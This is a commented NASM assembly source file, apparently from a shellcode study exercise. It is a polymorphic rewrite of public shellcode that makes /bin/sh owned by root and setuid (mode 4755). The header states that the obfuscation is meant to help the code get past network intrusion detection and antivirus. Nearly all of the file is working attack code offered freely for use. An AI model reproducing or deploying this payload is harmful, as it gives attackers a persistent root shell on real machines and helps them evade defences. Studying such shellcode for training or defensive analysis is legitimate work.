;  poly3.nasm ( polymorphic rewrite)
;  commented disassembly of shellcode to chown root:root and chmod 4755 /bin/sh
;  downloaded fromhttp://www.shell-storm.org/shellcode/files/shellcode-643.php
;  original shellcode written by gunslinger_
;
;  a polymorphic version
;  that obfuscates portions of the code which may bypass NIDS/AV.  
;
;  May 8, 2013
;
; This program was re-written by John W. Pierce, CISSP.  I enter it into
; the public domain.  You are free to use and/or redistribute it without 
; restriction, though attribution would be the right thing to do.  I hope
; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
;
; John W. Pierce, CISSP, remsanattexascarverdotcom 

global	_start

section	.text

_start:
;
;	First I'll remove the jmp/call/pop and get directly into the code
;

;  
;       chown, fchown, lchown - change ownership of a file
;       int chown(const char *path, uid_t owner, gid_t group);
;
;	Zero out eax, ecx, edx (ebx will be filled entirely, so doesn't need to be zeroed
xor	ecx, ecx
mul	ecx		;	product stored in edx:eax
push	ecx		;	zero terminate string
mov	ebx, 0x61a4d01	;	//hs XORed with nib/ + 1
dec	ebx		;	had to add a 1 because of 0 byte where 2f xored with 2f
push	ebx
mov	ebx, 0x6e69622f ;	nib/
xor	[esp],ebx	;	decode nib/
push	ebx		;	and store //hs
mov	ebx, esp	;	*path, ecx and edx already 0:0 for owner:group
mov	al, 0xb6	;	chown
int	0x80
;	returns 0 on success, -1 on fail, assume 0 so no need to reset eax, fail will fail on next
; 	instruction as well, so no harm done

;
;       chmod, fchmod - change permissions of a file
;       int chmod(const char *path, mode_t mode);
;
;	eax, ecx, edx all 0, ebx = *path
mov	al, 0xf		;	chmod
mov	cx, 0x9ed	;	mode (octal) 4755, -rwsr-xr-x
int	0x80
;	returns 0 on success, -1 on fail and ebx contains errno?
;
;       _exit, _Exit - terminate the calling process
;       void _exit(int status);
;
push	byte	0x1
pop	eax		;	not really necessary to set exit code to zero so omitted
int	0x80
